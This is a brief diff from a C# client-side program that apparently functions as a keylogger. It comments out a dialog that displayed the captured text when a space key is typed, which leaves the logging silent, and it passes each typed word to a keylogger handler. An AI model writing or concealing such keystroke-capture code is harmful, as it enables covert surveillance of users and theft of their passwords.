@@ -61,7 +61,7 @@ namespace ClientSide
 
                         if (i == 32) // if type space 
                         {
-                            ShowErrorDialog(input+", "+ifLive);
+                            //ShowErrorDialog(input+", "+ifLive);
                             if(ifLive)
                             {
                                 wordFromKeylogger handler = Program.updateCurrentKeylogger;
